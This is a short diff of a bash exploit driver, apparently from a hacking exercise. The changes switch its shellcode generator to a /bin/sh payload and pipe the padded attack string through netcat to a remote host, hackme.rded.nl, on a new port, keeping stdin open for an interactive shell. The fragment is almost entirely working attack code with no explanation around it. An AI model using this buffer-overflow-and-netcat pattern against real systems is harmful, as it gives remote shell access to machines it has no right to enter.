@@ -42,7 +42,7 @@ fi
 
 # third argument is padding for our address
 if ! [ "$3" = "" ]; then 
-        attackstr="$(./shellcode list $3)${attackstr}"
+        attackstr="$(./shellcode shell $3)${attackstr}"
     # for i in $(seq 0 $3); do
     #    attackstr="A${attackstr}" 
     # done
@@ -60,5 +60,5 @@ echo "Attackstring is $(echo -n $attackstr | wc -c) bytes" >&2  # print to stder
 
 # Uncomment if you want to run the /bin/sh shell code (./shellcode shell)
 # echo $attackstr
-(echo $attackstr; cat -) | nc hackme.rded.nl 24142
+(echo $attackstr; cat -) | nc hackme.rded.nl 60791
 ## This composed command allows stdin to remain open, which would otherwise have been closed by the EOF sent by echo.
